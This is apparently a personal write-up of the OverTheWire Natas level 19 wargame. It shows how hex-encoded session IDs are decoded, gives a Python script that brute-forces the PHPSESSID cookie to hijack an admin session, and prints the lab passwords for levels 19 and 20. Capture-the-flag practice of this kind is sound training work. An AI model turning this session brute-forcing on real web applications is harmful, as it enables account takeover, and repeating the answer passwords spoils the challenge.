![[Pasted image 20260716141023.png]]
So, the session IDs are no longer sequential. Let's try `admin:admin`
![[Pasted image 20260716141138.png]]

The session ID:
![[Pasted image 20260716141218.png]]

That session ID looks like HEX. Let's try decode it:
![[Pasted image 20260716141446.png]]

Interesting find. However, I am not sure if the max ID is still 640. Let's try another one:
![[Pasted image 20260716141640.png]]

I would like to try to brute force the session ID again from 1 to 640 and cross the fingers. So our script would be:
```python
import httpx
import base64

url = "http://natas19.natas.labs.overthewire.org?debug"

b64_bytes = base64.b64encode("natas19:qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT".encode('utf-8'))
b64_string = b64_bytes.decode('utf-8')

headers = {
    "Authorization":f"Basic {b64_string}",
    "Content-Type":"application/x-www-form-urlencoded"
    }

for i in range(1,641):
    with httpx.Client() as client:
        text_id = str(i)+"-admin"
        hex_id = text_id.encode('utf-8').hex()
        client.cookies.set("PHPSESSID", f"{hex_id}")
        response = client.get(url=url, headers=headers)

        print(f"Attempted session id: {i}:{hex_id}")

        if "You are logged in as a regular user." not in response.text:
            print(f"Admin session id found: {i}:{hex_id}")
            break

```
![[Pasted image 20260716142748.png]]

![[Pasted image 20260716142712.png]]

lvl20 pass: slOKYGsjlJhaqKliGvrgWAzln0JyrWao